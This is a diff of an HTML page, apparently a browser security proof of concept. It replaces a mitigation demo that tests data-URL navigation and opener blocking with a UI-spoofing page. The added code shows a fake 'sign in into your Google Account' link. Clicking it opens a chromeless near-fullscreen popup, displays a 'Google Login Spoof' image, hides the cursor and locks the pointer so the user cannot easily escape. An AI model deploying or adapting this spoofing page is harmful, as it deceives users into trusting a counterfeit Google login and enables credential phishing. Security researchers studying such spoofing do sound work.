@@ -1,54 +1,140 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Chrome UI Spoofing – Security Demo </title>
-<style>
-body { font-family: sans-serif }
-button { margin: 6px; padding: 10px }
-#log { white-space: pre-wrap; background:#111; color:#0f0; padding:10px }
-</style>
-</head>
-<body>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no" />
+    <title>URL TESTING WEBVIEW</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        overflow: hidden;
+        background: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        cursor: none; /* Sembunyikan kursor default setelah lock */
+      }
+      #spoof-img {
+        display: none; /* Awalnya disembunyikan */
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: 1;
+      }
+      .signin-link {
+        padding: 20px 40px;
+        background: #4285f4;
+        color: white;
+        font-size: 18px;
+        text-decoration: none;
+        border-radius: 4px;
+        cursor: pointer;
+        z-index: 10;
+        position: relative;
+      }
+    </style>
+    <script>
+      // Fungsi untuk mengaktifkan Pointer Lock
+      function requestPointerLock() {
+        const element = document.body; // atau document.documentElement
 
-<h2>Chrome Download / UI Spoofing (Mitigation Demo)</h2>
+        element.requestPointerLock =
+          element.requestPointerLock ||
+          element.mozRequestPointerLock ||
+          element.webkitRequestPointerLock;
 
-<button id="twitter">Twitter Spoof Test</button>
-<button id="opener">Opener Hijack Test</button>
+        if (!element.requestPointerLock) {
+          alert("Pointer Lock API tidak didukung di browser ini.");
+          return;
+        }
 
-<div id="log"></div>
+        element.requestPointerLock();
 
-<script>
-const log = msg => {
-  document.getElementById('log').textContent += msg + "\n"
-}
+        // Event listener untuk mendeteksi perubahan status pointer lock
+        document.addEventListener("pointerlockchange", pointerLockChange, false);
+        document.addEventListener("mozpointerlockchange", pointerLockChange, false);
+        document.addEventListener("webkitpointerlockchange", pointerLockChange, false);
 
-document.getElementById('twitter').onclick = () => {
-  log("[*] Opening twitter.com")
-  const w = window.open("https://twitter.com", "_blank")
+        // Opsional: listener untuk error
+        document.addEventListener("pointerlockerror", pointerLockError, false);
+        document.addEventListener("mozpointerlockerror", pointerLockError, false);
+        document.addEventListener("webkitpointerlockerror", pointerLockError, false);
+      }
 
-  setTimeout(() => {
-    try {
-      w.location.href = "data:text/html,<h1>Spoof</h1>"
-      log("[!] Attempted data: navigation")
-    } catch (e) {
-      log("[✓] Blocked by browser: " + e)
-    }
-  }, 1000)
-}
+      function pointerLockChange() {
+        if (
+          document.pointerLockElement ||
+          document.mozPointerLockElement ||
+          document.webkitPointerLockElement
+        ) {
+          console.log("Pointer Lock aktif");
+          // Di sini kamu bisa mulai mendengarkan movementX/movementY
+          document.addEventListener("mousemove", handleMouseMove, false);
+        } else {
+          console.log("Pointer Lock nonaktif");
+          document.removeEventListener("mousemove", handleMouseMove, false);
+        }
+      }
 
-document.getElementById('opener').onclick = () => {
-  log("[*] Opening child window")
-  const c = window.open("child.html", "_blank")
+      function pointerLockError() {
+        console.error("Gagal mengaktifkan Pointer Lock");
+      }
 
-  setTimeout(() => {
-    if (!c || c.opener === null) {
-      log("[✓] window.opener is NULL (noopener enforced)")
-    } else {
-      log("[!] opener still exists (old browser?)")
-    }
-  }, 1000)
-}
-</script>
-</body>
+      // Contoh handler gerakan mouse (bisa dihapus jika tidak dibutuhkan)
+      function handleMouseMove(e) {
+        const dx = e.movementX || e.mozMovementX || e.webkitMovementX || 0;
+        const dy = e.movementY || e.mozMovementY || e.webkitMovementY || 0;
+        // console.log("Mouse movement:", dx, dy);
+        // Lakukan sesuatu dengan dx/dy di sini jika diperlukan
+      }
+
+      function openWin() {
+        // Buka popup hampir fullscreen (sama seperti sebelumnya)
+        var params =
+          "width=" +
+          screen.width +
+          ",height=" +
+          screen.height +
+          ",top=0,left=0" +
+          ",menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no";
+        var win = window.open("opener.html", "google_signin", params);
+        if (win) {
+          win.moveTo(0, 0);
+          win.resizeTo(screen.width, screen.height);
+        }
+
+        // Tampilkan gambar spoof langsung
+        document.getElementById("spoof-img").style.display = "block";
+
+        // Sembunyikan tombol setelah 1 detik
+        setTimeout(function () {
+          document.querySelector(".signin-link").style.display = "none";
+        }, 1000);
+
+        // Kembalikan fokus ke window utama
+        window.focus();
+
+        // Aktifkan Pointer Lock setelah sedikit delay (pastikan gesture masih valid)
+        setTimeout(function () {
+          requestPointerLock();
+        }, 100);
+      }
+    </script>
+  </head>
+  <body>
+    <!-- Tombol awal -->
+    <a href="#" class="signin-link" onclick="openWin(); return false;">
+      Double Click here to sign in into your Google Account v2
+    </a>
+
+    <!-- spoof.png akan muncul langsung setelah klik -->
+    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
+  </body>
 </html>
